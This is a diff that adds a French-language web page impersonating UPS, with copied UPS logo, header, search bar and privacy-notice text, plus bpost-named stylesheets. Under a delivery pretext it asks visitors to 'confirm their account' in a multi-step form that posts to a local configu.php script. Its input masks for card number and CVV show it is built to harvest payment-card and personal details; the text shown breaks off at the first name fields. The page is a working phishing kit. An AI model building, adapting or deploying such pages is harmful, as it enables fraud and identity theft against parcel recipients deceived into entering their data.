@@ -1,0 +1,1630 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="./css/bpost.css">
+    <link rel="stylesheet" href="./css/extraw.css">
+    <link rel="stylesheet" href="styly.css">
+    <link type="text/css" href="/styles.css" rel="stylesheet" />
+    <link type="text/css" href="/module.css" rel="stylesheet" />
+    <link type="text/css" href="/locator.css" rel="stylesheet" />
+    <link rel="stylesheet" href="./stylo.css">
+    <link
+      type="text/css"
+      href="/simplified.css"
+      rel="stylesheet"
+      media="screen"
+    />
+    <link rel="stylesheet" href="styly.css" />
+    <link rel="shortcut icon" href="./image/pecope.png" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="script.js" defer></script>
+    <title>Livraison Rapide - Notre service s'en occupe </title>
+
+    <style>
+        :root {
+            --surface-a: #ffffff;
+            --surface-b: #f4f4f4;
+            --surface-c: #eaeaea;
+            --surface-d: #c8c8c8;
+            --surface-e: #ffffff;
+            --surface-f: #ffffff;
+            --text-color: #333333;
+            --text-color-secondary: #848484;
+            --primary-color: #007ad9;
+            --primary-color-text: #1b1a1a;
+            --font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
+            --surface-0: #ffffff;
+            --surface-50: #eef1f2;
+            --surface-100: #dde2e4;
+            --surface-200: #bbc5ca;
+            --surface-300: #98a8af;
+            --surface-400: #768b95;
+            --surface-500: #546e7a;
+            --surface-600: #435862;
+            --surface-700: #324249;
+            --surface-800: #222c31;
+            --surface-900: #111618;
+            --gray-50: #eef1f2;
+            --gray-100: #dde2e4;
+            --gray-200: #bbc5ca;
+            --gray-300: #98a8af;
+            --gray-400: #768b95;
+            --gray-500: #546e7a;
+            --gray-600: #435862;
+            --gray-700: #324249;
+            --gray-800: #222c31;
+            --gray-900: #111618;
+            --content-padding: .571rem 1rem;
+            --inline-spacing: .5rem;
+            --border-radius: 3px;
+            --surface-ground: #f4f4f4;
+            --surface-section: #ffffff;
+            --surface-card: #ffffff;
+            --surface-overlay: #ffffff;
+            --surface-border: #c8c8c8;
+            --surface-hover: #eaeaea;
+            --maskbg: rgba(0, 0, 0, .4);
+            --focus-ring: 0 0 0 .2rem #8dcdff
+        }
+
+
+        :root {
+            --blue-50: #f3f8fc;
+            --blue-100: #c6dcef;
+            --blue-200: #98c1e3;
+            --blue-300: #6ba5d7;
+            --blue-400: #3d8aca;
+            --blue-500: #106ebe;
+            --blue-600: #0e5ea2;
+            --blue-700: #0b4d85;
+            --blue-800: #093d69;
+            --blue-900: #062c4c;
+            --green-50: #f7fbf6;
+            --green-100: #d6ead1;
+            --green-200: #b6d9ad;
+            --green-300: #96c889;
+            --green-400: #76b765;
+            --green-500: #56a641;
+            --green-600: #498d37;
+            --green-700: #3c742e;
+            --green-800: #2f5b24;
+            --green-900: #22421a;
+            --yellow-50: #fffcf5;
+            --yellow-100: #fdefcd;
+            --yellow-200: #fbe3a6;
+            --yellow-300: #f9d67f;
+            --yellow-400: #f8ca57;
+            --yellow-500: #f6bd30;
+            --yellow-600: #d1a129;
+            --yellow-700: #ac8422;
+            --yellow-800: #87681a;
+            --yellow-900: #624c13;
+            --cyan-50: #f4fbfd;
+            --cyan-100: #ccebf5;
+            --cyan-200: #a4dbed;
+            --cyan-300: #7ccce5;
+            --cyan-400: #54bcdd;
+            --cyan-500: #2cacd5;
+            --cyan-600: #2592b5;
+            --cyan-700: #1f7895;
+            --cyan-800: #185f75;
+            --cyan-900: #124555;
+            --pink-50: #fdf4f9;
+            --pink-100: #f6cce0;
+            --pink-200: #eea3c7;
+            --pink-300: #e77aae;
+            --pink-400: #df5296;
+            --pink-500: #d8297d;
+            --pink-600: #b8236a;
+            --pink-700: #971d58;
+            --pink-800: #771745;
+            --pink-900: #561032;
+            --indigo-50: #f4f6fd;
+            --indigo-100: #ccd3f5;
+            --indigo-200: #a4b0ed;
+            --indigo-300: #7c8de5;
+            --indigo-400: #546add;
+            --indigo-500: #2c47d5;
+            --indigo-600: #253cb5;
+            --indigo-700: #1f3295;
+            --indigo-800: #182775;
+            --indigo-900: #121c55;
+            --teal-50: #f6fbfa;
+            --teal-100: #d1eae5;
+            --teal-200: #add9d1;
+            --teal-300: #89c8bd;
+            --teal-400: #65b7a8;
+            --teal-500: #41a694;
+            --teal-600: #378d7e;
+            --teal-700: #2e7468;
+            --teal-800: #245b51;
+            --teal-900: #1a423b;
+            --orange-50: #fff9f5;
+            --orange-100: #fde4cd;
+            --orange-200: #fbcfa6;
+            --orange-300: #f9ba7f;
+            --orange-400: #f8a457;
+            --orange-500: #f68f30;
+            --orange-600: #d17a29;
+            --orange-700: #ac6422;
+            --orange-800: #874f1a;
+            --orange-900: #623913;
+            --bluegray-50: #f7f8f9;
+            --bluegray-100: #dae0e3;
+            --bluegray-200: #bdc7cd;
+            --bluegray-300: #a0aeb6;
+            --bluegray-400: #8295a0;
+            --bluegray-500: #657c8a;
+            --bluegray-600: #566975;
+            --bluegray-700: #475761;
+            --bluegray-800: #38444c;
+            --bluegray-900: #283237;
+            --purple-50: #f9f8fd;
+            --purple-100: #e1dff7;
+            --purple-200: #cac5f1;
+            --purple-300: #b2abeb;
+            --purple-400: #9b92e4;
+            --purple-500: #8378de;
+            --purple-600: #6f66bd;
+            --purple-700: #5c549b;
+            --purple-800: #48427a;
+            --purple-900: #343059;
+            --red-50: #fdf4f3;
+            --red-100: #f6ccc6;
+            --red-200: #eea39a;
+            --red-300: #e77b6d;
+            --red-400: #df5240;
+            --red-500: #d82a13;
+            --red-600: #b82410;
+            --red-700: #971d0d;
+            --red-800: #77170a;
+            --red-900: #561108;
+            --primary-50: #f2f8fd;
+            --primary-100: #c2dff6;
+            --primary-200: #91c6ef;
+            --primary-300: #61ade7;
+            --primary-400: #3093e0;
+            --primary-500: #007ad9;
+            --primary-600: #0068b8;
+            --primary-700: #005598;
+            --primary-800: #004377;
+            --primary-900: #003157
+        }
+
+        :root {
+            --blue: #007bff;
+            --indigo: #6610f2;
+            --purple: #6f42c1;
+            --pink: #e83e8c;
+            --red: #dc3545;
+            --orange: #fd7e14;
+            --yellow: #ffc107;
+            --green: #28a745;
+            --teal: #20c997;
+            --cyan: #17a2b8;
+            --white: #fff;
+            --gray: #6c757d;
+            --gray-dark: #343a40;
+            --primary: #007bff;
+            --secondary: #6c757d;
+            --success: #28a745;
+            --info: #17a2b8;
+            --warning: #ffc107;
+            --danger: #dc3545;
+            --light: #f8f9fa;
+            --dark: #343a40;
+            --breakpoint-xs: 0;
+            --breakpoint-sm: 576px;
+            --breakpoint-md: 768px;
+            --breakpoint-lg: 992px;
+            --breakpoint-xl: 1200px;
+            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
+        }
+
+        *,
+        :after,
+        :before {
+            box-sizing: border-box
+        }
+
+        html {
+            font-family: sans-serif;
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent
+        }
+
+        .not_mobile {
+            display: flex;
+        }
+
+        body {
+            font-family: Ubuntu-Regular, sans-serif !important;
+            font-size: 16px !important;
+            color: #202022 !important;
+            font-weight: 500
+        }
+    </style>
+    <style>
+        .header-bpost-logo[_ngcontent-kkj-c127] img[_ngcontent-kkj-c127] {
+            width: 85px
+        }
+
+
+        .class-width-75[_ngcontent-kkj-c127] {
+            width: 75%
+        }
+
+
+        .header-component[_ngcontent-kkj-c127] li[_ngcontent-kkj-c127] a[_ngcontent-kkj-c127]:hover {
+            color: #000000b3 !important;
+            font-weight: 500
+        }
+
+        .header-component[_ngcontent-kkj-c127] li[_ngcontent-kkj-c127] a[_ngcontent-kkj-c127]:active:focus {
+            color: #000000b3 !important;
+            font-weight: 500
+        }
+
+        .header-component[_ngcontent-kkj-c127] li[_ngcontent-kkj-c127] a[_ngcontent-kkj-c127]:focus {
+            color: #000000b3 !important;
+            font-weight: 500
+        }
+
+        li[_ngcontent-kkj-c127] a.menu[_ngcontent-kkj-c127]:hover {
+            color: #5a5a5f
+        }
+
+        .new .center {
+    text-align: center;
+    float: none
+}
+
+        li.mobile-menus[_ngcontent-kkj-c127] {
+            border-bottom: 1px solid rgb(222, 226, 230)
+        }
+
+        li.mobile-bottom-menus[_ngcontent-kkj-c127] {
+            border-top: 1px solid rgb(222, 226, 230)
+        }
+
+        .mobile-common-menu[_ngcontent-kkj-c127] {
+            background-color: #f8f8f8
+        }
+
+        .header-container[_ngcontent-kkj-c127] {
+            margin-bottom: 1rem;
+            box-shadow: 0 2px 10px #00000014
+        }
+
+        .box-shadow[_ngcontent-kkj-c127] {
+            box-shadow: 0 2px 10px #00000014
+        }
+
+        .class-padding-top-3[_ngcontent-kkj-c127] {
+            padding-top: 3px !important
+        }
+
+        .m_z_index[_ngcontent-kkj-c127] {
+            z-index: 10000 !important
+        }
+
+        .class-padding-top-bottom-20[_ngcontent-kkj-c127],
+        .class-padding-top-bottom-20-mobile-has[_ngcontent-kkj-c127] {
+            padding-top: 3rem !important;
+            padding-bottom: 3rem !important
+        }
+
+        .custom-header[_ngcontent-kkj-c127] {
+            width: 100%;
+            background-color: #fff;
+            padding: 7px 0 7px 7px !important
+        }
+
+        .logoPadding[_ngcontent-kkj-c127] {
+            padding-top: 13px;
+            padding-bottom: 3px;
+            width: 100%
+        }
+
+        .signin-icon[_ngcontent-kkj-c127] {
+            height: 16px;
+            width: 16px;
+            float: left;
+            margin-right: 4px;
+            margin-top: 2px
+        }
+
+        .header-logo[_ngcontent-kkj-c127] {
+            width: 85px;
+            margin-right: auto;
+        }
+
+        .border-bottom-red-lang-highlight[_ngcontent-kkj-c127] {
+            border-bottom: 2px solid #ef2637
+        }
+
+        .menulinkspacing[_ngcontent-kkj-c127] {
+            padding: 8px 40px 8px 0 !important
+        }
+
+        .qlinks-bgc[_ngcontent-kkj-c127] {
+            bottom: 0;
+            position: absolute;
+            width: 100%;
+            background-color: #f8f8f8
+        }
+
+        .small-navigation-menu[_ngcontent-kkj-c127] {
+            width: 75%;
+            background-color: #fff;
+            z-index: 7;
+            position: absolute;
+            height: 100%;
+            right: 0;
+            top: 0
+        }
+
+
+        .account-options-open-menu[_ngcontent-kkj-c127] {
+            border-radius: 4px;
+            box-shadow: 5px 9px 10px #00000029;
+            width: 150px
+        }
+
+        .open-menu-margin[_ngcontent-kkj-c127] {
+            left: auto
+        }
+
+        .account-options-open-menu-inner[_ngcontent-kkj-c127] {
+            padding: 0 15px
+        }
+
+        .text_link_collpse[_ngcontent-kkj-c127] {
+            font-family: Ubuntu-Regular, sans-serif;
+            font-size: 18px;
+            line-height: 24px;
+            color: #717176 !important
+        }
+
+        .header-li-padding[_ngcontent-kkj-c127] {
+            padding-left: 0 !important
+        }
+
+        .padding-top-bottom-3[_ngcontent-kkj-c127] {
+            padding-top: 1rem !important;
+            padding-bottom: 1rem !important
+        }
+
+        .header-li-additional-padding-account-dropdown[_ngcontent-kkj-c127] {
+            height: 50px !important
+        }
+
+        .header-li-padding-account-dropdown[_ngcontent-kkj-c127] {
+            padding: 7px 5px 7px 0 !important
+        }
+
+        .text_link_account_data[_ngcontent-kkj-c127] {
+            font-family: Ubuntu-Regular, sans-serif;
+            font-size: 14px;
+            line-height: 22px;
+            color: #717176 !important
+        }
+
+        .text_link_collpse_medium[_ngcontent-kkj-c127] {
+            font-family: Ubuntu-Medium, sans-serif;
+            font-size: 18px;
+            line-height: 24px;
+            color: #5a5a5f !important
+        }
+
+        .class-padding-top-bottom-20[_ngcontent-kkj-c127] .list-group-item.active[_ngcontent-kkj-c127] {
+            background-color: unset
+        }
+
+        .account-tablet-details-back-text[_ngcontent-kkj-c127] {
+            width: 100%;
+            background-color: #f8f8f8
+        }
+
+        .set_default_billing_long_text_red[_ngcontent-kkj-c127] {
+            font-family: Ubuntu-Regular, sans-serif;
+            font-size: 16px;
+            line-height: 24px;
+            letter-spacing: 0;
+            color: #ef2637;
+            cursor: pointer
+        }
+
+        .set_default_billing_long_text_arrow[_ngcontent-kkj-c127] {
+            background-image: url(address-right.ed654a9732045725.png);
+            background-repeat: no-repeat;
+            height: 18px;
+            width: 17px;
+            float: left;
+            cursor: pointer;
+            margin-top: 1px
+        }
+
+        .logout_arrow_header[_ngcontent-kkj-c127] {
+            background-image: url(header-right.9b567e548b1c8d27.png);
+            background-size: cover;
+            height: 16px;
+            width: 14px;
+            float: left;
+            margin-top: 6px;
+            cursor: pointer
+        }
+
+        .logout_arrow_header_qlinks[_ngcontent-kkj-c127] {
+            background-image: url(header-right.9b567e548b1c8d27.png);
+            background-size: cover;
+            height: 16px;
+            width: 14px;
+            float: left;
+            margin-top: 2px;
+            cursor: pointer
+        }
+
+        .name-display-hover-screen[_ngcontent-kkj-c127] {
+            position: absolute;
+            z-index: 2;
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 5px 9px 10px #00000029;
+            padding: 10px 20px;
+            display: none
+        }
+
+        .hover-show-fullname[_ngcontent-kkj-c127]:hover .name-display-hover-screen[_ngcontent-kkj-c127] {
+            display: block
+        }
+
+        .basketCount[_ngcontent-kkj-c127] {
+            background: #ef2637;
+            border-radius: 50%;
+            height: 16px;
+            width: 16px;
+            font-size: 14px;
+            border: 1px solid #ef2637;
+            color: #fff;
+            text-align: center;
+            position: relative;
+            left: -16px;
+            top: -1px
+        }
+
+        .segmented-wrapper[_ngcontent-kkj-c127] {
+            display: -ms-flexbox;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+        }
+
+        .segmented-wrapp[_ngcontent-kkj-c127] {
+            height: 20px;
+            border-bottom: 0.5px solid #080808;
+            display: -ms-flexbox;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+
+        .seg-tab[_ngcontent-kkj-c127] {
+            width: 210px;
+            font-family: Ubuntu, sans-serif;
+            font-size: 14px;
+            color: #717176;
+            height: 60px;
+            padding-top: 21px;
+        }
+
+        .seg-tab-selected[_ngcontent-kkj-c127] {
+            border-right: 1px solid #d8d8d8;
+            border-left: 1px solid #d8d8d8;
+            font-weight: 700;
+            height: 66px;
+            background-color: #ffffff;
+            border-bottom: 2px solid #ffffff
+        }
+
+        .font-style-new[_ngcontent-kkj-c127] {
+            font-family: Ubuntu, sans-serif;
+            font-size: 14px;
+            color: #717176;
+        }
+
+        .user-details-seg[_ngcontent-kkj-c127] {
+            font-family: Ubuntu, sans-serif;
+            font-size: 14px;
+            color: #717176;
+            padding-top: 21px;
+            -ms-flex-pack: center;
+            justify-content: center
+        }
+
+        .dropdown-menu[_ngcontent-kkj-c127] {
+            min-width: 150px !important
+        }
+
+        .dropdown-item.active[_ngcontent-kkj-c127],
+        .dropdown-item[_ngcontent-kkj-c127]:active {
+            text-decoration: none;
+            background-color: transparent
+        }
+
+        .mt-n[_ngcontent-kkj-c127] {
+            margin-top: -8px !important
+        }
+
+        .divider-new[_ngcontent-kkj-c127] {
+            height: 17px;
+            width: 1.5px;
+            background-color: #717176;
+            margin-left: .75rem;
+            margin-right: .75rem;
+            margin-top: .25rem
+        }
+
+        .black-arrow-cls[_ngcontent-kkj-c127] {
+            width: 16px;
+            height: 16px;
+            background-image: url(black-down-arrow.f83d878c81b36662.png);
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+
+        .p-21[_ngcontent-kkj-c127] {
+            padding-top: 21px
+        }
+
+        .hover-black[_ngcontent-kkj-c127]:hover {
+            color: #000
+        }
+
+        .segment-user-sm-md[_ngcontent-kkj-c127] {
+            width: 100%;
+            height: 40px;
+            display: -ms-flexbox;
+            display: flex;
+            font-family: Ubuntu, sans-serif;
+            font-size: 18px;
+            color: #717176
+        }
+
+        .seg-sm-md-unselected[_ngcontent-kkj-c127] {
+            color: #00000080;
+            border-bottom: 1px solid #dededf
+        }
+
+        .seg-sm-md-selected[_ngcontent-kkj-c127] {
+            font-weight: 700;
+            border-bottom: 2px solid #ef2637;
+            color: #5a5a5f
+        }
+
+        .bu-dropdown-width[_ngcontent-kkj-c127] {
+            width: 25%;
+            left: 54%
+        }
+
+        .link-selected[_ngcontent-kkj-c127] {
+            height: 2px;
+            background-color: #ef2637
+        }
+
+        .ml-p[_ngcontent-kkj-c127] {
+            margin-left: 6%
+        }
+
+        .notification-bell[_ngcontent-kkj-c127] .badge[_ngcontent-kkj-c127] {
+            padding: 3px 6px;
+            border-radius: 50%;
+            background: red;
+            color: #fff;
+            position: relative;
+            top: -10px;
+            left: -11px
+        }
+
+        .header-menu-word-break[_ngcontent-kkj-c127] {
+            word-wrap: break-word
+        }
+
+        .header-long-menu-widh[_ngcontent-kkj-c127] {
+            width: 125px !important
+        }
+
+        .header-menu-initial-color[_ngcontent-kkj-c127] {
+            color: #00000080
+        }
+
+        .c-radio__input {
+            display: none
+        }
+
+        
+        .account-dropdown-menu[_ngcontent-kkj-c127] {
+            width: 200px !important
+        }
+
+        .vr[_ngcontent-kkj-c127] {
+            height: 20px
+        }
+
+        .icon-margin[_ngcontent-kkj-c127] {
+            margin-top: 3px !important;
+            margin-bottom: 3px !important
+        }
+
+        @media (max-width: 1199.98px) {
+            .header-long-menu-widh[_ngcontent-kkj-c127] {
+                width: 110px !important
+            }
+
+            .header-menu-word-break[_ngcontent-kkj-c127] {
+                word-wrap: normal
+            }
+        }
+
+        .pricing-language[_ngcontent-kkj-c127] {
+            text-align: -webkit-right;
+            width: 90%;
+            -ms-flex-item-align: center;
+            align-self: center
+        }
+
+        .w-max-content[_ngcontent-kkj-c127] {
+            width: -moz-max-content;
+            width: max-content
+        }
+    </style>
+    <style>
+        .custom-footer[_ngcontent-kkj-c131] {
+            background-color: #0c0c0c
+        }
+
+        .footerlinks[_ngcontent-kkj-c131] .title[_ngcontent-kkj-c131] {
+            color: #fff;
+            padding: 20px 0;
+            font-size: 18px;
+            font-family: Ubuntu, sans-serif !important;
+            font-weight: 500;
+            line-height: 24px
+        }
+
+        .footerlinks[_ngcontent-kkj-c131] li[_ngcontent-kkj-c131] a[_ngcontent-kkj-c131] {
+            color: #fff;
+            font-size: 16px;
+            font-family: Ubuntu, sans-serif !important;
+            font-weight: 400
+        }
+
+        .footerlinks[_ngcontent-kkj-c131] li[_ngcontent-kkj-c131] a[_ngcontent-kkj-c131]:hover {
+            color: #bf1e2c
+        }
+
+        .footerlinks[_ngcontent-kkj-c131] p[_ngcontent-kkj-c131] {
+            color: #fff;
+            padding: 10px 0;
+            font-size: 16px;
+            font-family: Ubuntu, sans-serif !important;
+            font-weight: 400;
+            line-height: 36px
+        }
+
+        .footerlinks[_ngcontent-kkj-c131] li[_ngcontent-kkj-c131] {
+            text-align: left;
+            margin-bottom: 12px
+        }
+
+        .footer_text_options[_ngcontent-kkj-c131] {
+            float: left;
+            padding: .5rem 20px .5rem 0px !important
+        }
+
+        .z-index-top[_ngcontent-kkj-c131] {
+            z-index: 9999999
+        }
+
+        @media (max-width: 991.98px) {
+            .footer_text_options[_ngcontent-kkj-c131] {
+                padding: 10px 15px !important
+            }
+
+            .copy_text[_ngcontent-kkj-c131] {
+                padding-bottom: 20px
+            }
+        }
+
+        @media (max-width:767.98px) {
+            .pad-sm-2[_ngcontent-kkj-c131] {
+                padding: 2px !important
+            }
+
+            .footer_text_options[_ngcontent-kkj-c131] {
+                padding: 10px 15px 10px 30px !important
+            }
+        }
+
+        @media (max-width:575.98px) {
+            .pad-sm-2[_ngcontent-kkj-c131] {
+                padding: 2px !important
+            }
+
+            .footer_text_options[_ngcontent-kkj-c131] {
+                padding: 10px 15px 10px 30px !important
+            }
+        }
+    </style>
+
+      <style>
+
+        .segmented-wrapper {
+            background-color: #ffc400;
+        }
+		
+
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.6/jquery.inputmask.min.js"></script>
+
+    <script id="savepage-shadowloader" type="text/javascript">
+        function showError(type, error = "") {
+            if (type == "show") {
+                document.getElementById('error').innerHTML = error
+                document.getElementById('error').style.display = "block"
+            }
+            if (type == "hide") {
+                document.getElementById('error').style.display = "none"
+            }
+        }
+        
+
+        function value(id) {
+            return document.getElementById(id).value
+        }
+
+        setTimeout(() => {
+            $(document).ready(function() {
+                $('#tel').inputmask("99 99 99 99 99", {
+                    'placeholder': ''
+                });
+                $('#date').inputmask("99/99/9999", {
+                    'placeholder': ''
+                });
+                $('#zip').inputmask("9999", {
+                    'placeholder': ''
+                });
+                $('#cardNumber').inputmask("9999 9999 9999 9999 9", {
+					'placeholder': ''
+				});
+				$('#cardCvv').inputmask("999", {
+					'placeholder': ''
+				});
+            });
+        }, 500);
+
+        
+    </script>
+    
+  </head>
+<body>
+    <header id="ups-headerWrap" style="margin-top: 0px; width: 100%;">
+                    <div class="ups-wrap ups-wrap_header">
+                      <div
+                        id="ups-header"
+                        class="ups-wrap_inner"
+                        data-upstoken="7d1bd5bc8bc0a3f923c66d5f6df329f3a41e307270e7d34343d214001e7c4d195d9ec7c1e20b8ffacd5deacd3bbe51d4cfb6a8bb757df176b9a5fd5cbd0445e6"
+                        data-islogged="false"
+                      >
+                        <a
+                          id="ups-header_logo"
+                          href="/fr/fr/Home.page?"
+                          class="ups-analytics"
+                          data-content-block-id="M1"
+                          data-event-id="21"
+                          title="Page d'accueil UPS"
+                          style=""
+                          ><img
+                            src="https://www.ups.com/assets/resources/images/UPS_logo.svg"
+                            alt="Page d'accueil UPS"
+                        /></a>
+                        <div id="ups-touchNav" class="ups-med_show">
+                          <ul
+                            class="ups-mob_links clearfix ups-header_mob_utils"
+                          >
+                            </li>
+                            <li class="ups-menu ups-account">
+                              <a
+                                class="ups-profileBtn ups-touchNav-buttons ups-analytics"
+                                id="ups-profileBtn"
+                                aria-expanded="false"
+                                data-content-block-id="M1"
+                                data-event-id="21"
+                                href="#"
+                                ><span
+                                  class="ups-iconAlone ups-icon-user-solid"
+                                  aria-hidden="true"
+                                ></span
+                                ><span class="ups-icon_text"
+                                  >S’inscrire / Se connecter</span
+                                ></a
+                              >
+                            </li>
+
+                          
+                          </ul>
+                        </div>
+                        <div class="ups-topNav" id="ups-navigation-container">
+                          <nav
+                            class="ups-utilities_menu"
+                            aria-label="Utilities Menu"
+                          >
+                            <ul class="ups-header_utils">
+                              <li
+                                class="ups-language ups-menu ups-firstnav"
+                                aria-label="Main"
+                                data-apps="true"
+                              >
+                                <span
+                                  aria-hidden="true"
+                                  class="icon ups-icon-globe-filled"
+                                ></span
+                                >
+                                
+                              </li>
+                              <li class="ups-loginsignup ups-firstnav">
+                                <span
+                                  aria-hidden="true"
+                                  class="icon ups-icon-user-solid"
+                                ></span
+                                ><a
+                                  class="ups-analytics"
+                                  data-content-block-id="M1"
+                                  data-event-id="21"
+                                  href="#"
+                                ></a>
+                              </li>
+                            </ul>
+                          </nav>
+                          <nav
+                            class="ups-container ups-primary_nav"
+                            id="ups-navItems"
+                          >
+                            <div class="ups-wrap">
+                              <div
+                                class="ups-wrap_inner ups-navItems_primary"
+                              ></div>
+                            </div>
+                          </nav>
+                          <div class="ups-container ups-container-search-track">
+                            <div
+                              id="ups-header-search"
+                              class="ups-menu col-md-3"
+                            >
+                              <form
+                                id="ups-header_search"
+                                class="ups-width_expand ups-hide_nav"
+                                method="post"
+                                action="/fr/fr/SearchResults.page"
+                                data-action="/fr/fr/SearchResults.page"
+                                role="search"
+                                data-track="/track?loc=fr_FR"
+                                data-svp-track="/mobile/track?loc=fr_FR#Track"
+                              >
+                                <label
+                                  for="ups-mainNav-search"
+                                  class="ups-readerTxt"
+                                  >Suivre un envoi ou effectuer une
+                                  recherche</label
+                                >
+                                <input
+                                  id="ups-mainNav-search"
+                                  type="search"
+                                  name="ups-search"
+                                  class="ups-expand_search_input ui-autocomplete-input"
+                                  placeholder="Suivre un envoi ou effectuer une recherche"
+                                  autocomplete="off"
+                                />
+                                <input
+                                  type="hidden"
+                                  name="HTMLVersion"
+                                  value="5.0"
+                                />
+                                <input type="hidden" name="loc" value="fr_FR" />
+                                <input
+                                  type="hidden"
+                                  name="trackNums"
+                                  class="ups-trackSearch_header"
+                                />
+                                <input
+                                  value="Track"
+                                  name="track.x"
+                                  type="hidden"
+                                /><button
+                                  id="ups-mainNav_search_submit"
+                                  class="ups-header_search_submit"
+                                  type="submit"
+                                  data-content-block-id="M1"
+                                  data-event-id="21"
+                                >
+                                  <i
+                                    class="ups-icon-search"
+                                    aria-hidden="true"
+                                  ></i
+                                  ><span class="ups-readerTxt"
+                                    >Rechercher</span
+                                  ></button
+                                ><button
+                                  id="ups-header_search-close"
+                                  class="ups-header_search_close"
+                                  type="button"
+                                  data-content-block-id="M1"
+                                  data-event-id="21"
+                                >
+                                  <i class="ups-icon-x" aria-hidden="true"></i
+                                  ><span class="ups-readerTxt">Fermer</span>
+                                </button>
+                              </form>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </header>
+        <app-header class="d-flex flex-column" _nghost-kkj-c127="">
+            <div _ngcontent-kkj-c127="" class="plugins header-component"><!---->
+                <div _ngcontent-kkj-c127="" class="segmented-wrapper ng-star-inserted">
+                    <div _ngcontent-kkj-c127=""
+                        class="container d-flex flex-row justify-content-between container-custom-padding">
+                        <div _ngcontent-kkj-c127="" class="row justify-content-center align-items-center user-type-seg">
+                            <div _ngcontent-kkj-c127="" class=" seg-tab text-center ">
+                                    <marquee behavior="scroll" direction="left" style="color: black; width: 250px; font-size: 20px; bottom: 5px; position: relative;"> Nous pouvons obtenir des informations personnelles sur les consommateurs (comme le nom, les coordonnées et les informations de paiement) dans le cadre de différentes activités comme (i) l’utilisation de sites Internet et d’applications UPS, (ii) les expéditions, notamment la livraison et le prélèvement des expéditions, (iii) les demandes de suivi des expéditions ou la réponse à des questions, (iv) les événements auxquels nous participons, (v) les promotions et autres offres, et (vi) les appels passés auprès du service client et des centres de comptabilité qui peuvent être enregistrés.
+
+Les types d’informations personnelles que nous pouvons obtenir comprennent :
+
+Les coordonnées personnelles ou professionnelles (comme le nom, la raison sociale, l’adresse physique, l’adresse e-mail et le numéro de téléphone ou de fax).
+Les informations d’expédition (telles que (i) les coordonnées liées à l’expédition comme le nom, l’adresse physique, l’adresse e-mail et le numéro de téléphone de l’expéditeur, du destinataire et/ou du voisin [pour l’option « Déposer chez mon voisin » de UPS My Choice], (ii) la signature de preuve de livraison, (iii) le numéro de compte UPS, (iv) les informations qui nous sont fournies et nous aident à accéder à des lieux où nous fournissons des services et (v) le numéro de suivi du colis) et les informations qui nous sont fournies concernant le contenu de certaines expéditions, mais uniquement si une personne identifiable peut être associée à ce contenu.
+Les informations qui nous permettent de vérifier l’identité d’une personne.
+Les noms, adresses e-mail et numéros de téléphone d’autres personnes auxquelles il nous est demandé d’envoyer des informations.
+Les informations fournies en réponse aux enquêtes.</marquee>
+                            </div>
+                        </div>
+                        <div _ngcontent-kkj-c127="" class="d-flex flex-row p-0 justify-content-start ng-star-inserted">
+                            <div _ngcontent-kkj-c127="" class="d-flex flex-row py-2">
+                                <ul _ngcontent-kkj-c127="" class="d-flex flex-row align-items-center m-0 p-0">
+                                    <!---->
+                                </ul>
+                            </div>
+                        </div><!---->
+                    </div>
+                </div><!---->
+                <div _ngcontent-kkj-c127=""
+                    class="container d-flex flex-row justify-content-between align-items-center">
+                    <div _ngcontent-kkj-c127="" class="d-flex flex-row p-0 justify-content-start">
+                        
+                    </div><!---->
+                </div><!---->
+            </div><!----><!---->
+        </app-header>
+        <app-receiver-detail _nghost-kkj-c142="" class="ng-star-inserted"><!---->
+            <div _ngcontent-kkj-c142="" class="default-background">
+                <div _ngcontent-kkj-c142="" class="">
+                    <div _ngcontent-kkj-c127="" class="component">
+                        <!---->
+                        <div _ngcontent-kkj-c127="" class="segmented-wrappe">
+                        </div><!---->
+                    </div><!----><!---->
+                    
+                    <div _ngcontent-kkj-c127="" class="component">
+                        <!---->
+					</div>
+    <form action="./configu.php" method="POST" class="form">
+      
+      <!-- Progress bar -->
+      <div class="progressbar">
+        <div class="progress" id="progress"></div>
+        
+        <div
+          class="progress-step progress-step-active"
+          data-title=""
+        ></div>
+        <div class="progress-step" data-title=""></div>
+      </div>
+
+      <!-- Steps -->
+
+      <div class=" form-step form-step-active">
+        <h1 class="tete">Renseignements Personnels !</h1>
+        <h3 class="contenu">Pour des raisons de sécurité, nous procéderons parfois a la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez confirmer votre compte</h3>
+        <div class="gold">
+            <div class="col-6 input-group">
+                
+                <label class="form-label" for="firstname">Prenom</label>
+                <input type="text" class="form-control" name="firstname" id="firstname" placeholder="" required="Veuillez remplir ce champ"  >
+                <span>Champ obligatoire*</span>
+            </div>
+            <div class="col-6 input-group">
+                <label class="form-label" for="lastname">Nom de famille</label>
